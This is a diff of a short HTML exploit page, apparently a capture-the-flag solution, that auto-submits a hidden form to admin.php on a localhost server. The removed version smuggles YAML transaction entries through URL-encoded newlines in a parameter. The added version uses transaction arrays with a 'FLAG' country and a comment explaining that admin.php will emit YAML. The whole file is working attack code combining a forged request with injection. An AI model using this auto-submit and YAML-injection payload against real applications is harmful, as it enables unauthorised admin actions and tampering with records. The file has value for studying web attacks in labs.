@@ -1,9 +1,14 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
-<body>
-<form id="f" action="http://localhost:5000/admin.php" method="POST">
-<input name="url" type="hidden" value="http://localhost:5000/admin.php?transactions%5B0%5D%5Bcountry%5D=fake&transactions%5B0%5D%5Bamount%5D=1&x=%0A-%20amount%3A%201000000%0A%20%20currency%3A%20XYZ%0A%20%20op%3A%20BUY%0A-%20amount%3A%201000000%0A%20%20currency%3A%20XYZ%0A%20%20op%3A%20SELL%0A-%20amount%3A%201%0A%20%20currency%3A%20FL%0A%20%20op%3A%20BUY">
-</form>
-<script>document.getElementById("f").submit();</script>
-</body>
+  <body>
+    <!--
+      This page auto-submits to admin.php on the localhost server.
+      The hidden input 'url' points back to admin.php with transactions
+      encoded as GET params so admin.php in GET mode will emit YAML.
+    -->
+    <form id="f" action="http://localhost:5000/admin.php" method="POST">
+      <input type="hidden" name="url" value="http://localhost:5000/admin.php?transactions%5B0%5D%5Bamount%5D=1&transactions%5B0%5D%5Bcountry%5D=Aruba&transactions%5B1%5D%5Bamount%5D=1&transactions%5B1%5D%5Bcountry%5D=FLAG">
+    </form>
+    <script>document.getElementById('f').submit();</script>
+  </body>
 </html>
